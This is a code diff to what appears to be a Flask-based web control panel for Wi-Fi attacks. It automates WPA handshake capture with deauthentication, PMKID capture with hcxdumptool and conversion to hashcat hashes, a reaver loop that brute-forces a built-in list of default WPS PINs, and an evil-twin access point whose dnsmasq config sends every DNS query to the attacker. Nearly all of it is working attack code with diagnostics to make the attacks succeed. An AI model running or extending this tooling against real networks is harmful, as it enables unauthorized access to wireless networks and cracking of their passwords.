-        elapsed = 0
+        # ── Poll loop ─────────────────────────────────────────────────────────
+        _restart_grace  = [0]   # ticks to skip after restart (only when file empty)
+        _last_ac_check  = 0.0
+        _last_cap_sz    = 0     # last seen cap size — skip verify if unchanged
+        _consecutive_partial = 0  # count verify runs with same EAPOL count
+        elapsed         = 0
+
         while elapsed < timeout:
-            time.sleep(3); elapsed += 3  # 3s poll — matches fufu-sec's sleep 5 but faster
+            time.sleep(3); elapsed += 3
+
+            # Check airodump still alive
             proc = state["active_processes"].get("handshake_cap")
             if proc and proc.poll() is not None:
                 _log("[!] airodump-ng died — restarting")
-                _restart_airodump("airodump died"); continue
-            cap_sz = os.path.getsize(current_cap) if os.path.exists(current_cap) else 0
-            _log(f"[~] {elapsed}s elapsed — file: {cap_sz} bytes — checking...")
-            if cap_sz <= 1024: continue
-
-            # Step 1: fast tshark EAPOL pre-filter (fufu-sec: tshark -Y eapol | head -100)
-            # This catches natural reconnects (client came back on its own) immediately —
-            # no need to wait for aircrack-ng's slower open-file parse.
-            eapol_count = _tshark_eapol_count(current_cap, bssid, timeout_sec=3)
-            if eapol_count < 2:
-                # Not enough EAPOL frames yet — skip the heavy aircrack-ng check
-                if eapol_count == 1:
-                    _log(f"[~] 1 EAPOL frame seen (need ≥2 for a complete handshake) — waiting...")
+                _restart_airodump("airodump died")
+                _restart_grace[0] = 3
                 continue
-            _log(f"[~] tshark: {eapol_count} EAPOL frames — running aircrack-ng verify...")
 
-            # Step 2: confirm with aircrack-ng (6s live-file timeout)
-            # Longer timeout reduces false negatives caused by write races between
-            # airodump-ng (still writing) and aircrack-ng (reading open file)
-            live_ok, _, _ = _ac_verify(current_cap, bssid, timeout_sec=6)
-            if live_ok:
-                _log(f"[~] Candidate detected at {elapsed}s — stopping for closed-file verify")
-                if _confirm_and_finish(current_cap):
-                    state["handshake_running"] = False; return
+            cap_sz = os.path.getsize(current_cap()) if os.path.exists(current_cap()) else 0
+            _log(f"[~] {elapsed}s — {cap_sz} bytes — checking...")
+
+            # Grace period: only skip when file is still empty
+            if _restart_grace[0] > 0:
+                if cap_sz == 0:
+                    _restart_grace[0] -= 1
+                    _log(f"[~] {elapsed}s — waiting for airodump to start writing...")
+                    continue
+                else:
+                    _restart_grace[0] = 0   # data arrived — clear grace
+
+            if cap_sz < 1024:
+                continue
+
+            # Auto-restart if file stuck at same size for >10s
+            if cap_sz == 0 and elapsed >= 10:
+                import time as _t
+                now = _t.time()
+                last_restart = getattr(_restart_airodump, "_last_ts", 0)
+                if now - last_restart >= 10:
+                    _log("[!] File still empty after 10s — restarting airodump")
+                    _restart_airodump("empty file")
+                    _restart_airodump.__dict__["_last_ts"] = now
+                    _restart_grace[0] = 3
+                continue
+
+            # Fast EAPOL pre-check with tshark
+            eapol_count = _tshark_eapol_count(current_cap(), bssid, timeout_sec=3)
+            if eapol_count < 2:
+                if eapol_count == 1:
+                    _log("[~] 1 EAPOL frame (need ≥2 for complete handshake) — waiting...")
+                elif eapol_count == 0:
+                    # Log every 3 ticks (9s) — elapsed%10 never fires with 3s poll
+                    if (elapsed // 3) % 3 == 0:
+                        _log(f"[~] {elapsed}s — no EAPOL frames — waiting for client reconnect...")
+                    # PMF pivot: if PMF likely and no EAPOL after 15s, suggest PMKID
+                    if pmf_detected and elapsed == 15:
+                        _log("⚠  PMF active + no EAPOL after 15s — clients are ignoring deauth")
+                        _log("   The 4-way handshake cannot be forced on this AP.")
+                        _log(f"   → Switch to PMKID attack: Handshake tab → PMKID → capture {bssid} ch{channel}")
+                continue
+
+            _log(f"[~] tshark: {eapol_count} EAPOL frame(s) — running aircrack-ng verify...")
+
+            # Throttle: only re-verify when file size changes OR every 15s.
+            # If 4 EAPOL frames stay static for multiple ticks, the partial
+            # handshake (msg1+msg2 only) will never complete — restart capture.
+            import time as _t2
+            now = _t2.time()
+            if now - _last_ac_check < 5 and cap_sz == _last_cap_sz:
+                _last_cap_sz = cap_sz
+                continue
+            _last_ac_check = now
+            _last_cap_sz   = cap_sz
+
+            live_result, _, _ = _ac_verify(current_cap(), bssid, timeout_sec=6)
+            if live_result is True:
+                _log(f"[~] Candidate at {elapsed}s — stopping for closed-file verify")
+                if _confirm_and_finish(current_cap()):
+                    state["handshake_running"] = False
+                    return
+                # False positive — restart
                 _restart_airodump("false positive")
+                _restart_grace[0] = 3
+            elif live_result == "pmkid":
+                state["pmkid_in_handshake_cap"] = current_cap()
+                if not state.get("_pmkid_logged"):
+                    state["_pmkid_logged"] = True
+                    _log("[~] PMKID detected — AP has PMF active, deauth is ignored")
+                    _log("    → Use Handshake → PMKID tab for PMKID cracking")
 
+        # ── Timeout ───────────────────────────────────────────────────────────
         _log(f"[*] Timeout ({timeout}s) reached — final verification")
-        deauth_stop.set(); kill_bg("handshake_cap"); time.sleep(2.0)
-        if _full_verify(current_cap):
-            state.update({"handshake_found": True, "handshake_result": "CAPTURED",
-                          "last_cap_file": current_cap})
-            _log(f"[+] ✓ HANDSHAKE CONFIRMED at timeout: {current_cap}")
-            audit("HANDSHAKE_CAPTURED", f"bssid={bssid} file={current_cap}")
+        deauth_stop.set()
+        kill_bg("handshake_cap")
+        time.sleep(2.0)
+
+        if _full_verify(current_cap()):
+            state.update({"handshake_found": True,
+                          "handshake_result": "CAPTURED",
+                          "last_cap_file":    current_cap(),
+                          "last_hs_cap_file": current_cap()})
+            _log(f"[+] ✓ HANDSHAKE CONFIRMED at timeout: {current_cap()}")
+            audit("HANDSHAKE_CAPTURED", f"bssid={bssid} file={current_cap()}")
         else:
-            state.update({"handshake_found": False, "handshake_result": "FAILED_NO_HANDSHAKE"})
+            state.update({"handshake_found": False,
+                          "handshake_result": "FAILED_NO_HANDSHAKE"})
             _log("[-] No complete handshake captured.")
-            pmf_note = " ← LIKELY CAUSE (WPA3/SAE detected)" if pmf_detected else ""
-            _log(f"    • PMF/802.11w on AP — deauth cryptographically ignored{pmf_note}")
-            _log("      If PMF: wait for natural client reconnect (power cycle a device on the AP)")
-            _log("    • No active clients on AP at time of capture")
-            _log(f"    • Injection may not be working — test: aireplay-ng --test {iface}")
-            _log("    • Interface may have been renamed — verify: iw dev")
-            _log(f"    • Retry with explicit client MAC (look in scan CSV for associated client)")
+            pmf_note = " ← LIKELY CAUSE" if pmf_detected else ""
+            if pmf_detected:
+                _log(f"    • PMF/802.11w active — deauth is cryptographically ignored{pmf_note}")
+                pmkid_cap = state.get("pmkid_in_handshake_cap", "")
+                if pmkid_cap and os.path.exists(pmkid_cap):
+                    _log(f"    ✓ PMKID was captured in: {pmkid_cap}")
+                    _log("      → Use Handshake → PMKID tab → Convert + Crack")
+                else:
+                    _log("      → Use Handshake → PMKID tab for PMKID attack")
+            _log("    • No active clients on AP at capture time")
+            _log(f"    • Test injection: aireplay-ng --test {iface}")
+            _log("    • Retry with a specific client MAC (from scan CSV)")
+            _log("    • Interface renamed? Check: iw dev")
             audit("HANDSHAKE_FAILED", f"bssid={bssid}")
+
         state["handshake_running"] = False
 
     threading.Thread(target=hs_worker, daemon=True).start()
-    return jsonify({"success": "Handshake capture started. Deauth fires in 2 seconds.",
-                    "output": "\n".join(log_lines), "cap_file": cap_file})
+    return jsonify({"success": "Handshake capture started. Deauth fires in 3 seconds.",
+                    "output": "\n".join(state["hs_log"]),
+                    "cap_file": cap_file})
+
 
 
 @app.route("/api/handshake/status")
@@ -916,15 +1114,123 @@ def handshake_delete():
     return jsonify({"error": f"File not found: {filepath}"})
 
 
+# Per-session handshake verify cache: {path: (size_at_last_check, has_handshake)}
+# Avoids re-running aircrack-ng on files that haven't changed size.
+_hs_list_cache: dict = {}
+
+@app.route("/api/tmp/list")
+def tmp_list():
+    """List all capture-related files in TMPDIR with sizes and types."""
+    if not os.path.exists(TMPDIR):
+        return jsonify({"files": [], "total_size": 0})
+    files = []
+    total = 0
+    for f in sorted(os.listdir(TMPDIR)):
+        fp = os.path.join(TMPDIR, f)
+        if not os.path.isfile(fp):
+            continue
+        sz = os.path.getsize(fp)
+        total += sz
+        # Classify by extension
+        if f.endswith(".cap"):            ftype = "cap"
+        elif f.endswith(".csv"):          ftype = "csv"
+        elif f.endswith(".kismet.netxml"): ftype = "netxml"
+        elif f.endswith(".kismet.csv"):   ftype = "kismet_csv"
+        elif f.endswith("_22000.txt"):    ftype = "hash22000"
+        elif f.endswith(".txt"):          ftype = "txt"
+        elif f.endswith(".pcapng"):       ftype = "pcapng"
+        elif f.endswith(".pot"):          ftype = "pot"
+        else:                             ftype = "other"
+        files.append({"name": f, "path": fp, "size": sz, "type": ftype})
+    return jsonify({"files": files, "total_size": total, "count": len(files)})
+
+
+@app.route("/api/tmp/cleanup", methods=["POST"])
+def tmp_cleanup():
+    """Delete files from TMPDIR by type. Accepts {types: ["cap","csv","netxml","hash22000","all"]}."""
+    data  = request.json or {}
+    types = data.get("types", [])
+    if not types:
+        return jsonify({"error": "No file types specified"}), 400
+
+    # Map type names to extension suffixes
+    TYPE_MAP = {
+        "cap":        [".cap"],
+        "csv":        [".csv"],
+        "netxml":     [".kismet.netxml"],
+        "kismet_csv": [".kismet.csv"],
+        "hash22000":  ["_22000.txt"],
+        "txt":        [".txt"],
+        "pcapng":     [".pcapng"],
+        "pot":        [".pot"],
+        "other":      [],   # handled by "all"
+    }
+    delete_all = "all" in types
+
+    deleted = []; skipped = []; errors = []
+    protected = {"fufu-sec.log", "audit.log", "bl.txt"}
+
+    for f in os.listdir(TMPDIR):
+        fp = os.path.join(TMPDIR, f)
+        if not os.path.isfile(fp) or f in protected:
+            continue
+        if not _safe_path(fp, TMPDIR):
+            continue
+        should_delete = delete_all
+        if not should_delete:
+            for t in types:
+                exts = TYPE_MAP.get(t, [])
+                if any(f.endswith(e) for e in exts):
+                    should_delete = True
+                    break
+        if should_delete:
+            try:
+                os.remove(fp)
+                deleted.append(f)
+            except Exception as ex:
+                errors.append(f"{f}: {ex}")
+        else:
+            skipped.append(f)
+
+    # Invalidate handshake list cache for deleted files
+    global _hs_list_cache
+    _hs_list_cache = {k: v for k, v in _hs_list_cache.items() if os.path.exists(k)}
+
+    audit("TMP_CLEANUP", f"deleted={len(deleted)} types={types}")
+    return jsonify({
+        "deleted": deleted, "deleted_count": len(deleted),
+        "errors":  errors,  "skipped_count": len(skipped),
+        "success": f"Deleted {len(deleted)} file(s)"
+    })
+
+
 @app.route("/api/handshake/list")
 def handshake_list():
-    files = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
-    last_bssid = state.get("last_bssid","").upper(); annotated = []
+    global _hs_list_cache
+    # Include all .cap files: hs_* (handshake), hs_r* (restart), mon_* (monitor)
+    files = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR)
+                    if f.endswith(".cap") and not f.endswith("_rt.cap")])
+    last_bssid = state.get("last_bssid","").upper()
+    annotated  = []
     for fp in files:
-        sz = os.path.getsize(fp); has_hs = False
-        if sz >= 1024:
-            ok, _, _ = _ac_verify(fp, last_bssid); has_hs = ok
-        annotated.append({"path": fp, "size": sz, "has_handshake": has_hs})
+        if not os.path.exists(fp): continue
+        sz = os.path.getsize(fp); has_hs = False; has_pmkid = False
+        if sz >= 200:
+            cached_sz, cached_hs = _hs_list_cache.get(fp, (-1, False))
+            if cached_sz == sz and cached_hs is True:
+                has_hs = True   # confirmed 4-way handshake, cached
+            else:
+                result, _, _ = _ac_verify(fp, last_bssid)
+                if result is not True and last_bssid:
+                    result, _, _ = _ac_verify(fp, "")   # no-filter fallback
+                has_hs    = (result is True)
+                has_pmkid = (result == "pmkid")
+                _hs_list_cache[fp] = (sz, result)
+        annotated.append({"path": fp, "size": sz,
+                          "has_handshake": has_hs,
+                          "has_pmkid": has_pmkid})
+    # Prune stale cache entries for deleted files
+    _hs_list_cache = {k: v for k, v in _hs_list_cache.items() if os.path.exists(k)}
     return jsonify({"files": files, "annotated": annotated, "count": len(files)})
 
 
@@ -933,12 +1239,12 @@ def handshake_list():
 @app.route("/api/pmkid/capture", methods=["POST"])
 def pmkid_capture():
     """
-    PMKID capture — matches fufu-sec launch_pmkid_capture() exactly.
-    Three command variants based on hcxdumptool version (fufu-sec logic):
-      >= 6.3.0 : BPF filter via tcpdump (-c <ch> --rds=1 --bpf=<file>)
-      >= 6.0.0 : --filterlist_ap=<file> --filtermode=2   (BSSID in file, no colons)
-      < 6.0.0  : --filterlist=<file> --filtermode=2      (older flag name)
-    The user's version is 6.3.5 which requires the BPF method.
+    PMKID capture — separated from handshake capture.
+    Uses hcxdumptool with three command variants based on version:
+      >= 6.3.0 : BPF filter via tcpdump (CRITICAL: no 2>&1 redirect on BPF file)
+      >= 6.0.0 : --filterlist_ap=<file> --filtermode=2
+      <  6.0.0 : --filterlist=<file> --filtermode=2
+    Output: pcapng → hcxpcapngtool → hashcat 22000 hash file
     """
     data    = request.json or {}
     bssid   = (data.get("bssid") or "").strip().upper()
@@ -946,134 +1252,178 @@ def pmkid_capture():
     timeout = int(data.get("timeout", 45))
     iface   = get_active_iface()
 
-    if not iface:  return jsonify({"error": "No monitor interface"})
-    if not tool_exists("hcxdumptool"): return jsonify({"error": "hcxdumptool not installed"})
+    if not iface:
+        return jsonify({"error": "No monitor interface. Enable monitor mode first."})
+    if not tool_exists("hcxdumptool"):
+        return jsonify({"error": "hcxdumptool not installed — apt install hcxdumptool"})
 
-    # Detect hcxdumptool version — mirrors fufu-sec get_hcxdumptool_version()
+    # Detect hcxdumptool version
     ver_out, _, _ = run_cmd("hcxdumptool --version 2>&1 | head -1")
     ver_match = re.search(r"hcxdumptool\s+(\S+)", ver_out)
-    hcx_ver = ver_match.group(1) if ver_match else "0.0.0"
+    hcx_ver   = ver_match.group(1) if ver_match else "0.0.0"
 
     def _ver_ge(v, minimum):
-        """Compare version strings numerically."""
         try:
             vp = [int(x) for x in v.split(".")]
             mp = [int(x) for x in minimum.split(".")]
-            # pad to same length
             while len(vp) < len(mp): vp.append(0)
             while len(mp) < len(vp): mp.append(0)
             return vp >= mp
         except Exception:
             return False
 
-    out_pcap = TMPDIR + "pmkid.pcapng"
-    out_hash = TMPDIR + "pmkid_hash.txt"
+    # ── Named output files ──────────────────────────────────────────────
+    # Include ESSID in filename and a sequential counter so repeated
+    # captures of the same AP are never overwritten.
+    # Format: pmkid_{essid_safe}_{n}.txt  (e.g. pmkid_KingKong_1.txt)
+    def _safe_essid(bssid_str):
+        """Look up ESSID from scan results, return filesystem-safe version."""
+        net = next((n for n in state.get("scan_results",[]) 
+                    if n.get("bssid","").upper() == bssid_str.upper()), None)
+        raw = (net.get("ssid","") if net else "") or "unknown"
+        safe = re.sub(r"[^A-Za-z0-9_-]", "_", raw)[:32].strip("_") or "unknown"
+        return safe
+
+    essid_safe = _safe_essid(bssid) if bssid else "unknown"
+
+    def _next_pmkid_n(essid_tag):
+        """Return next sequential index for this ESSID."""
+        n = 1
+        while os.path.exists(TMPDIR + f"pmkid_{essid_tag}_{n}.txt"):
+            n += 1
+        return n
+
+    pmkid_n   = _next_pmkid_n(essid_safe)
+    out_pcap  = TMPDIR + f"pmkid_{essid_safe}_{pmkid_n}.pcapng"
+    out_hash  = TMPDIR + f"pmkid_{essid_safe}_{pmkid_n}.txt"
+
     log_lines = [
+        f"[*] Starting hcxdumptool PMKID capture...",
+        f"[*] Channel: {channel or '(all)'}",
+        f"[*] BSSID filter: {bssid or '(all)'}",
         f"[*] hcxdumptool version: {hcx_ver}",
         f"[*] Interface : {iface}",
         f"[*] BSSID     : {bssid or '(any)'}",
+        f"[*] ESSID     : {essid_safe}",
         f"[*] Timeout   : {timeout}s",
-        f"[*] Output    : {out_hash}",
+        f"[*] Output    : {out_hash}  (capture #{pmkid_n} for this AP)",
     ]
 
-    # Clean old files
-    for f in [out_pcap, out_hash, TMPDIR+"pmkid.bpf", TMPDIR+"target.txt"]:
+    # Only clean BPF/target helper files — keep previous hash captures
+    for f in [out_pcap, TMPDIR+"pmkid.bpf", TMPDIR+"target.txt"]:
         try: os.remove(f)
         except: pass
 
     if _ver_ge(hcx_ver, "6.3.0"):
-        # BPF method (fufu-sec >= 6.3.0 branch)
-        # Requires: tcpdump, channel, bssid
+        # BPF method — exactly as airgeddon launch_pmkid_capture() line 15031.
+        # hcxdumptool >= 6.3.0 removed --filterlist_ap; BPF is the only filter method.
+        # FIX vs original: use "wlan host {bssid}" instead of "wlan addr3 {bssid}".
+        # "wlan host X" matches addr1 OR addr2 OR addr3 OR addr4 — catches all
+        # EAPOL/authentication frames regardless of which address field the BSSID
+        # appears in. "wlan addr3" only matches addr3, missing EAPOL on Realtek.
         if not bssid or not channel:
-            return jsonify({"error": "BSSID and channel required for hcxdumptool >= 6.3.0 (BPF method)"})
+            return jsonify({"error": "BSSID and channel required for hcxdumptool >= 6.3.0"})
         if not tool_exists("tcpdump"):
-            return jsonify({"error": "tcpdump required for hcxdumptool >= 6.3.0 — apt install tcpdump"})
-        # Build BPF filter: tcpdump -i <iface> wlan addr3 <bssid> -ddd > pmkid.bpf
-        bpf_out, bpf_err, bpf_rc = run_cmd(
-            f"tcpdump -i {iface} 'wlan addr3 {bssid}' -ddd > {TMPDIR}pmkid.bpf 2>&1",
-            timeout=10
-        )
-        if bpf_rc != 0:
-            # Fallback: try without quotes around the filter expression
-            run_cmd(f"tcpdump -i {iface} wlan addr3 {bssid} -ddd > {TMPDIR}pmkid.bpf 2>&1", timeout=10)
-        # hcxdumptool -c syntax: <channel> for 2.4GHz, <channel>a for 5GHz
-        # CH 1-14 = 2.4GHz (no suffix), CH 36+ = 5GHz (append 'a')
-        # Band modifier — matches airgeddon launch_pmkid_capture() exactly
-        # airgeddon v11.61 line 15024-15028:
-        #   channel > 14 → "b"  (5GHz)
-        #   channel ≤ 14 → "a"  (2.4GHz)
+            return jsonify({"error": "tcpdump required — apt install tcpdump"})
+
+        run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)
+        bpf_file = TMPDIR + "pmkid.bpf"
+        # Use "wlan host" (matches ALL address fields) not "wlan addr3" (addr3 only)
+        _, _, bpf_rc = run_cmd(
+            f"tcpdump -i {iface} wlan host {bssid} -ddd > {bpf_file} 2>/dev/null",
+            timeout=10)
+
+        # Validate BPF: first line must be a positive integer (instruction count)
+        bpf_valid = False
+        if os.path.exists(bpf_file) and os.path.getsize(bpf_file) > 0:
+            try:
+                first_line = open(bpf_file).readline().strip()
+                bpf_valid  = first_line.isdigit() and int(first_line) > 0
+            except Exception:
+                pass
+        if not bpf_valid:
+            log.warning(f"BPF with 'wlan host' failed (rc={bpf_rc}) — trying 'wlan addr3'")
+            _, _, bpf_rc2 = run_cmd(
+                f"tcpdump -i {iface} wlan addr3 {bssid} -ddd > {bpf_file} 2>/dev/null",
+                timeout=10)
+            try:
+                first_line = open(bpf_file).readline().strip()
+                bpf_valid  = first_line.isdigit() and int(first_line) > 0
+            except Exception:
+                pass
+
         ch_int = int(channel)
-        hcxdumptool_band_modifier = "b" if ch_int > 14 else "a"
-        hcx_params = f"-c {channel}{hcxdumptool_band_modifier} --rds=1 --bpf={TMPDIR}pmkid.bpf -w {out_pcap}"
-        log_lines.append(f"[*] Method    : BPF (>= 6.3.0)")
-        log_lines.append(f"[*] Band      : {'5GHz' if ch_int > 14 else '2.4GHz'} (modifier={hcxdumptool_band_modifier})")
+        band   = "b" if ch_int > 14 else "a"
+        hcx_params = f"-c {channel}{band} --rds=1 --bpf={bpf_file} -w {out_pcap}"
+        log_lines += [
+            f"[*] Method    : BPF (>= 6.3.0, airgeddon-faithful)",
+            f"[*] Band      : {'5GHz' if ch_int > 14 else '2.4GHz'} (modifier={band})",
+            f"[*] BPF valid : {'YES' if bpf_valid else 'NO — may still work without filter'}",
+            f"[*] BPF filter: wlan host {bssid} (all address fields)",
+        ]
+
     elif _ver_ge(hcx_ver, "6.0.0"):
-        # filterlist_ap method (fufu-sec 6.0.0 <= ver < 6.3.0)
         bssid_nocolon = bssid.replace(":", "") if bssid else ""
-        target_file = TMPDIR + "target.txt"
-        with open(target_file, "w") as tf:
-            tf.write(bssid_nocolon + "\n")
+        target_file   = TMPDIR + "target.txt"
+        with open(target_file, "w") as tf: tf.write(bssid_nocolon + "\n")
         hcx_params = f"--enable_status=1 --filterlist_ap={target_file} --filtermode=2 -o {out_pcap}"
-        log_lines.append(f"[*] Method    : filterlist_ap (>= 6.0.0)")
+        log_lines.append("[*] Method    : filterlist_ap (>= 6.0.0)")
     else:
-        # Legacy filterlist method (fufu-sec < 6.0.0)
         bssid_nocolon = bssid.replace(":", "") if bssid else ""
-        target_file = TMPDIR + "target.txt"
-        with open(target_file, "w") as tf:
-            tf.write(bssid_nocolon + "\n")
+        target_file   = TMPDIR + "target.txt"
+        with open(target_file, "w") as tf: tf.write(bssid_nocolon + "\n")
         hcx_params = f"--enable_status=1 --filterlist={target_file} --filtermode=2 -o {out_pcap}"
-        log_lines.append(f"[*] Method    : filterlist (< 6.0.0)")
+        log_lines.append("[*] Method    : filterlist (< 6.0.0)")
 
     cmd = f"hcxdumptool -i {iface} {hcx_params}"
     log_lines.append(f"[*] Command   : {cmd}")
 
-    # Kill any competing processes that may hold the interface
-    # (mirrors airgeddon's airmon check kill approach)
+    # Kill competing processes that hold the interface
     for competing in ["capture", "handshake_cap", "scan", "pmkid"]:
         kill_bg(competing)
     time.sleep(0.5)
     run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)
 
     proc = run_bg("pmkid", cmd)
-    time.sleep(2.0)   # hcxdumptool needs ~2s to arm the interface
+    time.sleep(2.0)   # hcxdumptool needs ~2s to arm interface
     if proc.poll() is not None:
-        try: err_out = proc.stdout.read(1200).strip()
+        try:    err_out = proc.stdout.read(1200).strip()
         except: err_out = ""
         lo = (err_out or "").lower()
-        # Parse hcxdumptool error for user-friendly diagnosis
         diag = []
         if "packet_statistics" in lo or "arm interface" in lo:
-            diag.append("Interface busy or driver conflict — another process holds the interface")
-            diag.append(f"Fix: run 'airmon-ng check kill' then retry, or disable/enable monitor mode")
+            diag.append("Interface busy — run 'airmon-ng check kill' then retry")
         if "monitor mode may not work" in lo or "driver is broken" in lo:
-            diag.append("Adapter driver does not support hcxdumptool — try a different adapter (Alfa AWUS036ACH)")
+            diag.append("Adapter driver not supported — try Alfa AWUS036ACH")
         if "permission" in lo or "eperm" in lo:
-            diag.append("Permission error — run server.py as root: sudo python3 server.py")
+            diag.append("Permission error — run as root: sudo python3 server.py")
         if not diag:
-            diag.append("Check interface and permissions")
-        err_msg = " | ".join(diag)
-        log_lines.append(f"[!] hcxdumptool failed: {err_msg}")
-        if err_out: log_lines.append(err_out[:400])
-        return jsonify({
-            "error": f"hcxdumptool failed: {err_msg}",
-            "output": "\n".join(log_lines)
-        })
+            diag.append(f"hcxdumptool failed: {err_out[:200] if err_out else 'unknown error'}")
+        return jsonify({"error": " | ".join(diag), "output": "\n".join(log_lines)})
 
     audit("PMKID_START", f"bssid={bssid or 'any'} ver={hcx_ver}")
 
     def _stop_and_convert():
         time.sleep(timeout)
         kill_bg("pmkid")
-        time.sleep(1.0)  # flush
+        time.sleep(1.0)
         if os.path.exists(out_pcap) and os.path.getsize(out_pcap) > 0:
+            # Mirror airgeddon line 15046: check for "PMKID(s)? written" in output
             conv_out, _, _ = run_cmd(f"hcxpcapngtool -o {out_hash} {out_pcap} 2>&1")
-            if os.path.exists(out_hash) and os.path.getsize(out_hash) > 0:
+            log.debug(f"hcxpcapngtool: {conv_out[:300]}")
+            pmkid_written = bool(re.search(
+                r"PMKID(s)?\s+written|EAPOL\s+written|written",
+                conv_out, re.IGNORECASE))
+            hash_exists   = os.path.exists(out_hash) and os.path.getsize(out_hash) > 0
+            if pmkid_written or hash_exists:
                 state["pmkid_result"] = "done"
                 state["pmkid_hash"]   = out_hash
                 audit("PMKID_DONE", f"bssid={bssid} hash={out_hash}")
             else:
+                log.warning(f"hcxpcapngtool no PMKID: {conv_out[:200]}")
                 state["pmkid_result"] = "no_pmkid"
         else:
+            log.warning("pmkid.pcapng missing or empty after capture")
             state["pmkid_result"] = "no_pmkid"
         state["pmkid_running"] = False
 
@@ -1088,7 +1438,46 @@ def pmkid_capture():
 
 
 
-
+@app.route("/api/pmkid/list")
+def pmkid_list():
+    """List all captured PMKID hash files with metadata."""
+    files = []
+    if os.path.exists(TMPDIR):
+        for f in sorted(os.listdir(TMPDIR)):
+            # Only match pmkid_{essid}_{n}.txt where n is a digit sequence
+            # Exclude: pmkid_verify.txt, pmkid_hash.txt, etc.
+            if not f.endswith(".txt") or not f.startswith("pmkid_"):
+                continue
+            # Must end with _{digits}.txt
+            name_check = f[:-4]  # strip .txt
+            last_part  = name_check.split("_")[-1]
+            if not last_part.isdigit():
+                continue  # skip pmkid_verify.txt, pmkid_hash.txt, etc.
+            fp = os.path.join(TMPDIR, f)
+            if not os.path.isfile(fp):
+                continue
+            sz    = os.path.getsize(fp)
+            lines = 0
+            try:
+                with open(fp) as fh:
+                    lines = sum(1 for l in fh if l.strip())
+            except Exception:
+                pass
+            # Parse essid and capture number from filename: pmkid_{essid}_{n}.txt
+            name_no_ext = f[:-4]           # strip .txt
+            parts       = name_no_ext.split("_")
+            # parts[0]="pmkid", parts[1...-1]=essid parts, parts[-1]=n (if digit)
+            cap_n  = parts[-1] if parts[-1].isdigit() else "?"
+            essid  = "_".join(parts[1:-1]) if parts[-1].isdigit() else "_".join(parts[1:])
+            files.append({
+                "name":    f,
+                "path":    fp,
+                "size":    sz,
+                "hashes":  lines,
+                "essid":   essid,
+                "capture": cap_n,
+            })
+    return jsonify({"files": files, "count": len(files)})
 
 
 @app.route("/api/pmkid/inspect", methods=["POST"])
@@ -1261,6 +1650,16 @@ def pmkid_verify():
         return jsonify({"output": "\n".join(log), "valid": False, "hash_count": 0,
                         "error": "No PMKID hashes match the specified BSSID"})
 
+@app.route("/api/pmkid/status")
+def pmkid_status():
+    """Lightweight PMKID capture progress endpoint."""
+    return jsonify({
+        "running":  state.get("pmkid_running", False),
+        "result":   state.get("pmkid_result",  "idle"),
+        "hash_file": state.get("pmkid_hash",   ""),
+    })
+
+
 @app.route("/api/pmkid/stop", methods=["POST"])
 def pmkid_stop():
     kill_bg("pmkid")
@@ -1325,9 +1724,11 @@ def wps_pixie():
                     "error": None if key_m else "Pixie Dust failed"})
 
 
-@app.route("/api/wps/pins", methods=["POST"])
-def wps_pins():
-    data = request.json or {}; bssid = data.get("bssid","")
+def _get_known_pins(bssid=""):
+    """Shared helper — returns deduplicated PIN list for a BSSID.
+    Used by both the /api/wps/pins route and wps_pinattack() directly,
+    avoiding the fragile wps_pins().get_data() internal-route-call pattern.
+    """
     known_pins = ["12345670","00000000","11111111","22222222","33333333","44444444",
                   "55555555","66666666","77777777","88888888","99999999","20172527",
                   "46264848","76229909","62327145","10864111","31957199","30432031","71412252","01741625"]
@@ -1340,8 +1741,15 @@ def wps_pins():
                     if prefix in line.upper():
                         pins = re.findall(r"\b\d{8}\b", line)
                         if pins: known_pins = pins + known_pins; break
-        except: pass
-    return jsonify({"pins": list(dict.fromkeys(known_pins))})
+        except Exception:
+            pass
+    return list(dict.fromkeys(known_pins))
+
+
+@app.route("/api/wps/pins", methods=["POST"])
+def wps_pins():
+    data = request.json or {}; bssid = data.get("bssid","")
+    return jsonify({"pins": _get_known_pins(bssid)})
 
 
 @app.route("/api/wps/pinattack", methods=["POST"])
@@ -1350,7 +1758,7 @@ def wps_pinattack():
     iface = get_active_iface()
     if not bssid: return jsonify({"error": "BSSID required"})
     audit("WPS_PINATTACK", f"bssid={bssid}")
-    pins = json.loads(wps_pins().get_data())["pins"]
+    pins = _get_known_pins(bssid)
     out = [f"[*] Trying {len(pins)} known PINs against {bssid}"] + [f"[>] Queued PIN: {p}" for p in pins[:5]]
     run_bg("pinattack", f"for pin in {' '.join(pins)}; do reaver -i {iface} -b {bssid} -c {channel or 1} -p $pin -v --no-nacks 2>&1 | grep -E 'WPA PSK|locked' || true; done")
     return jsonify({"output": "\n".join(out), "success": f"PIN attack launched — {len(pins)} PINs"})
@@ -1372,7 +1780,16 @@ def eviltwin_start():
     with open(HOSTAPD_CONF, "w") as f:
         f.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n{wpa_block}")
     with open(DNSMASQ_CONF, "w") as f:
-        f.write(f"interface={iface}\ndhcp-range={subnet.rsplit('.',1)[0]}.2,{subnet.rsplit('.',1)[0]}.30,255.255.255.0,12h\ndhcp-option=3,{subnet}\ndhcp-option=6,{subnet}\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/{subnet}\n")
+        # listen-address=127.0.0.1 removed — it conflicts with interface= binding
+        # and prevents dnsmasq from serving DHCP on the AP interface.
+        f.write(f"interface={iface}\n"
+                f"bind-interfaces\n"
+                f"dhcp-range={subnet.rsplit('.',1)[0]}.2,{subnet.rsplit('.',1)[0]}.30,255.255.255.0,12h\n"
+                f"dhcp-option=3,{subnet}\n"
+                f"dhcp-option=6,{subnet}\n"
+                f"server=8.8.8.8\n"
+                f"log-queries\nlog-dhcp\n"
+                f"address=/#/{subnet}\n")
     run_cmd(f"ip addr add {subnet}/24 dev {iface} 2>/dev/null || true")
     run_cmd(f"ip link set {iface} up")
     run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -1439,8 +1856,7 @@ def deauth():
     proc = run_bg("deauth", cmd); time.sleep(1.5)
     partial = ""
     try:
-        import select as _sel
-        if _sel.select([proc.stdout],[],[],1.5)[0]:
+        if select.select([proc.stdout],[],[],1.5)[0]:
             for _ in range(20):
                 line = proc.stdout.readline()
                 if not line: break
@@ -1554,7 +1970,15 @@ def injection_test():
